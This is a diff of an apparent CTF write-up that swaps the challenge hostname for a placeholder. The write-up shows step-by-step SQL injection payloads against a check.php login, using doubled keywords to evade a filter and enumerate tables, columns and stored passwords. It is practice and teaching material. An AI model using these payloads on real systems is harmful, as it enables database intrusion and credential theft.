@@ -7,7 +7,7 @@
 
 
 ```sql
-http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password=admin'
+http://xxx.cn:81/check.php?username=admin&password=admin'
 ```
 
 
@@ -31,7 +31,7 @@ You have an error in your SQL syntax; check the manual that corresponds to your 
 
 
 ```sql
-http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='order by 1%23'
+http://xxx.cn:81/check.php?username=admin&password='order by 1%23'
 ```
 
 
@@ -59,7 +59,7 @@ You have an error in your SQL syntax; check the manual that corresponds to your 
 
 
 ````sql
-http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,3%23'
+http://xxx.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,3%23'
 ````
 
 
@@ -81,7 +81,7 @@ Your password is '3'
 
 
 ```sql
-http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,database(),version()%23'
+http://xxx.cn:81/check.php?username=admin&password='ununionion selselectect 1,database(),version()%23'
 
 http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,user(),@@version_compile_os%23'
 ```
@@ -105,7 +105,7 @@ user		root@localhost！
 
 
 ```sql
-http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema= 'geek'%23'
+http://xxx.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema= 'geek'%23'
 ```
 
 
@@ -127,9 +127,9 @@ Your password is 'b4bsql,geekuser'
 
 
 ```sql
-http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name= 'b4bsql'%23'
+http://xxx.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name= 'b4bsql'%23'
 
-http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name= 'geekuser'%23'
+http://xxx.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name= 'geekuser'%23'
 ```
 
 
@@ -151,9 +151,9 @@ Your password is 'id,username,password'
 
 
 ```sql
-http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,username frfromom b4bsql%23
+http://xxx.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,username frfromom b4bsql%23
 
-http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,passwoorrd frfromom b4bsql%23
+http://xxx.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,passwoorrd frfromom b4bsql%23
 ```
 
 
@@ -179,7 +179,7 @@ Your password is 'i_want_to_play_2077'
 
 
 ```sql
-http://bc18ac42-f1bd-4fb9-a274-2ebb248c618b.node4.buuoj.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql%23
+http://xxx.cn:81/check.php?username=admin&password='ununionion selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql%23
 ```
 
 
